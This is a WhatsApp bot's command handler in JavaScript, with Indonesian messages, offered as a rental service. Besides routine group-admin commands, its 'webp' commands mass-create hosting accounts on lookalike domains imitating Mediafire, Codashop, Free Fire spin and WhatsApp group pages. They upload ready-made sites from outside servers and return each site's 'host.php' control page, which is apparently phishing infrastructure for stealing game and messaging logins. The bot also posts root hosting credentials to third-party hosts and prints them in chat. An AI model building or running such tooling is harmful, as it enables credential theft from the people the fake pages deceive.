const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins,updateDatabase } = require('./lib/functions.js')
const { exec } = require('child_process')
const fs = require('fs')
const request = require("request")
module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = / ^[°zZ' ' #$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+ ,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isOwner = nomorOwner.includes(senderNumber) || isSaya
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const validGrup=(id,array)=>{for(var i=0;i<array.length;i++){if(array[i]==id){return!0}}
return!1}
0

// kirimprib(hasillrndy
const kirimprib =async(text,id) => { await semar.sendMessage(id,{text: text},{quoted:msg}) }

//ALL DATABASE
server = JSON.parse(fs.readFileSync('./database/server.json'))
grups = JSON.parse(fs.readFileSync('./database/grups.json'))
switch (command) {

    // 2 OKTOBER 2022
    // FITUR HOST BY RNDYBOTZ
      
        case 'update':
        if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        
            if(args == ""){
            psn = `SILAHKAN DI SIMAK
jika ingin update url server ketik *${prefix}${command}* url | xnxx.com
             
jika ingin update username server ketik *${prefix}${command}* username | rndytech
             
jika ingin update password server ketik *${prefix}${command}* password | @@##rndytech##@@
             
jika ingin update ipaddress server ketik *${prefix}${command}* ip | 1.1.1.1
             
jika ingin tambah grup ketik *${prefix}${command}* grup | 120363024065162195@g.us
            `
            reply(psn)
            }else{
                
                jenis = args[0]
                isi = args[2]
            
            update= updateDatabase(jenis,isi)
            if(update == "success"){
            server = JSON.parse(fs.readFileSync('./database/server.json'))
            grups = JSON.parse(fs.readFileSync('./database/grups.json'))
            
                info = `SUKSES UPDATE!!!

            

            `





            reply(info)
                }
                
            }
            
            break
            
            case 'infobot' :
            if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            id = msg.key.remoteJid
        
            info = `INFO SETINGAN BOT HOST
            
-- DETAIL AKUN ROOT--
Server = ${server[0].url}
Username = ${server[0].username}
Password = ${server[0].password}
Ip address = ${server[0].ip}
            
            `
            reply(info);
            
            break
            
        case 'listgrup':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
        let text = "LIST GRUP VIP :\n\n"
            for (let i = 0; i < grups.length; i++) {
                text += "> "+ grups[i] + "\n";
            }
            reply(text)
            
            
            break    
            case 'cekidgrup':
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
                id = msg.key.remoteJid
                pengirim = msg.key.participant
                nama = msg.pushName
          

    await semar.sendMessage(pengirim,{text: `HALO ${nama} \n\n ${id} \n\n`},{quoted:msg})

            break 

//CASE HOST
case 'create' :
    reply("sedang membuat...")
    if(args != ""){
    parse = dn.split(" | ")
        user = parse[0]
        pass = parse[1]
        pkg = parse[2]
        
host = server[0].url
uroot = server[0].username
proot = server[0].password
domain = user +".login"
var inputt = {
    
                  server: host,
              uroot: uroot,
              proot: proot,
                 user: user,
              pass: pass,
              domain: domain,
              pkg: pkg,
          }
          
          request.post({
              url: 'https://randiramli.com/api/hosting/create.php',
              form: inputt
            }, function(error, response, body){
    reply(body)
    })
    
    // console.log(parse)
}
        break

case 'ceksmtp' :
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
    var inputt = {
        
        server: host,
        uroot: uroot,
              proot: proot,
          }
          
          request.post({
              url: 'https://yogax.my.id/smtp.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
 
        break

case 'cekdefault' :
 
    host = server[0].url
    uroot = server[0].username
    proot = server[0].password
 var inputt = {
     
              server: host,
              uroot: uroot,
              proot: proot,
            }
 
          request.post({
              url: 'https://randiramli.com/api/hosting/cekdefault.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
        break
        case 'termint' :
            if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Owner!')
            user = args[0]
            host = server[0].url
            uroot = server[0].username
proot = server[0].password
var inputt = {
    
              server: host,
              uroot: uroot,
              proot: proot,
              user: user,
            }
            
          request.post({
              url: 'https://randiramli.com/api/hosting/termint.php',
              form: inputt
            }, function(error, response, body){
                reply(body)
            })
            
            break
            case 'addpack' :
                if(args != ""){
                parse = dn.split(" | ")
                    user = parse[0]
                    pkg = parse[1]
 host = server[0].url
 uroot = server[0].username
 proot = server[0].password
 var inputt = {

     server: host,
              uroot: uroot,
              proot: proot,
              user: user,
              pkg: pkg,
          }
 
          request.post({
              url: 'https://randiramli.com/api/hosting/addpack.php',
              form: inputt
            }, function(error, response, body){
reply(body)
})
}else{
    reply("masukin parameter bang!")
}
        break
        case 'public':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break
        case 'private': case 'self':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break
//CASE HOST


case 'menuweb' :
case 'webp' :
case 'buatweb' :
    menuweb = `
═══[ > [「 𝙈𝙀𝙉𝙐 」] < ]═══⊱
➤ .webp1 : Mediafire MP4
➤ .webp2 : Mediafire FILE
➤ .webp3 : Simontok
➤ .webp4 : Grup Wa V1
➤ .webp5 : Grup Wa V2
➤ .webp6 : Codashop True Id
➤ .webp7 : Spin Ff True Id
═══[ > Bot Rapz X Kiki < ]═══⊱
*SEWA BOT 5K MANEN*
https://chat.whatsapp.com/GKFIzgg5FJtAZdzEd7hBKU

Ketik : *.webp1* untuk membuat web.

TOLONG BERI JEDA 1-3 MENIT
AGAR BOT TIDAK DELAY / RUSAK
KARENA YANG PAKAI BANYAK 🙏`
reply(menuweb)
break


                  case 'webp1' :
                   id = msg.key.remoteJid
         if(validGrup(id,grups)){


         function makeid(length) {
             var result = '';
             var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                 result += characters.charAt(Math.floor(Math.random() *
                     charactersLength));
             }
             return result;
         }

         //GANTI DATA LOGIN DI SINI
         host = server[0].url
         uroot = server[0].username
        proot = server[0].password
         ipanda = server[0].ip
         domain = "mediafire" + makeid(7) + "." + "vipz-download.my.id"


         namamu = msg.pushName
         idmu = msg.key.participant
         reply("Proses....")


         var inputt = {

             server: host,
             userwhm: uroot,
           passwhm: proot,
             ip: ipanda,
             domain: domain
         }

         request.post({
             url: 'https://memeya.mnz.biz.id/api-webp/mediafire/createcp.php',
             form: inputt
         }, function (error, response, body) {

             function afakahinijson(str) {
                 try {
                     JSON.parse(str);
                 } catch (e) {
                     return false;
                 }
                 return true;
             }
    console.log(body)
             if (afakahinijson(body)) {
                 hasil = JSON.parse(body)
                 user = hasil.user
                 pass = hasil.pass
                 domain = hasil.domain
                
                 user = user.replace(/\s+/g, '');
                 pass = pass.replace(/\s+/g, '');
                 
                 //INI BATAS
                 var inputt = {

                     server: host,
                     user: user,
                     pass: pass,
                     userwhm: uroot,
                     passwhm: proot,
                 }

                 request.post({
                     url: 'https://memeya.mnz.biz.id/api-webp/mediafire/upload.php',
                     form: inputt
                 }, function (error, res, body) {
                   


                     hasillrndy = `- Web Mediafire\n==========================\nWebsite : https://${domain}/vhsfhqpdhdsih6\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/host.php\n==========================\n_Tunggu 1-5 Menit Agar webnya siap digunakan_`


                  reply(`Berhasil Dikirim Ke ${namamu}`, idmu)
                     kirimprib(hasillrndy, idmu)
                 })
             } else {
                 reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
             }
         })
     }else{
         reply("ini grup siapa?")
     }
  break

                  case 'webp2' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuwxyz';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "mediafire" + makeid(7) + "." + "bct.baru1.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("Proses....")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://memeya.mnz.biz.id/api-webp/mediafire2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://memeya.mnz.biz.id/api-webp/mediafire2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `- Web Mediafire File\n==========================\nWebsite : https://${domain}/vhsfhqpdhdsih6\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/host.php\n==========================\n_Tunggu 1-5 Menit Agar webnya siap digunakan_`


                 reply(`Berhasil Dikirim Ke ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
break

                  case 'webp3' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontokelo" + makeid(7) + "." + "vipz-download.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("Proses....")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://memeya.mnz.biz.id/api-webp/simontok/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://memeya.mnz.biz.id/api-webp/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `- Web Simontok\n==========================\nWebsite : https://${domain}/vhsfhqpdhdsih6\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/host.php\n==========================\n_Tunggu 1-5 Menit Agar webnya siap digunakan_`


                 reply(`Berhasil Dikirim Ke ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
break


                  case 'webp4' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "grupwav1ral" + makeid(7) + "." + "vipz-download.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("Proses....")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://memeya.mnz.biz.id/api-webp/grupwa/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://memeya.mnz.biz.id/api-webp/grupwa/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `- Web Group Wa\n==========================\nWebsite : https://${domain}/vhsfhqpdhdsih6\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/host.php\n==========================\n_Tunggu 1-5 Menit Agar webnya siap digunakan_`


                 reply(`Berhasil Dikirim Ke ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
break

                  case 'webp5' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "grupwhatasapp" + makeid(7) + "." + "bct.baru1.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("Proses....")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://memeya.mnz.biz.id/api-webp/grupwa2/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://memeya.mnz.biz.id/api-webp/grupwa2/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `- Web Group WhatsApp\n==========================\nWebsite : https://${domain}/vhsfhqpdhdsih6\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/host.php\n==========================\n_Tunggu 1-5 Menit Agar webnya siap digunakan_`


                 reply(`Berhasil Dikirim Ke ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
break

                  case 'webp6' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "codashp" + makeid(7) + "." + "vipz-download.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("Proses....")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://memeya.mnz.biz.id/api-webp/codashop/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
 
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://memeya.mnz.biz.id/api-webp/codashop/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `- Web codashop\n==========================\nWebsite : https://${domain}/vhsfhqpdhdsih6\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/host.php\n==========================\n_Tunggu 1-5 Menit Agar webnya siap digunakan_`


                 reply(`Berhasil Dikirim Ke ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
break

                  case 'webp7' :
                  id = msg.key.remoteJid
        if(validGrup(id,grups)){


        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "spin-ff" + makeid(7) + "." + "vipz-download.my.id"


        namamu = msg.pushName
        idmu = msg.key.participant
        reply("Proses....")

        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.jubzhosting.me/freefire/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }
// console.log(body)
            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                }

                request.post({
                    url: 'https://memeya.mnz.biz.id/api-webp/freefire/upload.php',
                    form: inputt
                }, function (error, res, body) {
                   


                    hasillrndy = `- Web Spin\n==========================\nWebsite : https://${domain}/vhsfhqpdhdsih6\nWeb Setting : https://${domain}/vhsfhqpdhdsih6/host.php\n==========================\n_Tunggu 1-5 Menit Agar webnya siap digunakan_`


                 kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    }else{
        reply("ini grup siapa?")
    }
break

case 'grup':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (args.length < 1) return reply("silahkan pilih grup open/close")
if (args[0] === 'open'){ await semar.groupSettingUpdate(from, 'not_announcement')
} else if (args[0] === 'close'){ await semar.groupSettingUpdate(from, 'announcement')} else { reply('yang bener lah pantek')}
break

case 'antilink': {

if (!isCreator) return m.reply('sory hubungi owner untuk menggunakan fitur ini')

if (!m.isGroup) throw groupon(from)

if (!isBotAdmins) throw SiGroupadmin(from)

if (!isAdmins) throw sticAdmin(from)

if (args.length < 1) return m.reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')

if (args[0] === "on") {

if (AntiLink) return m.reply('Sudah Aktif')

ntilink.push(from)

m.reply('Succes menyalakan antilink di group ini 🌷')

} else if (args[0] === "off") {

if (!AntiLink) return m.reply('Sudah Mati')

let off = ntilink.indexOf(from)

ntilink.splice(off, 1)

m.reply('Succes mematikan antilink di group ini 🌷')

} else {

m.reply('on untuk mengaktifkan, off untuk menonaktifkan')

}

}

break

case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

case 'leave':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from)
break

case 'delete': case 'd': case 'del':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

case 'restart':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 restart index`, (error, stdout, stderr) => {
    reply("BERHASIL RESTART ULANG")
    reply(stdout)
})
break

case 'shutdown':
if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break
default:
}} catch (e) {
console.log(e)
}
}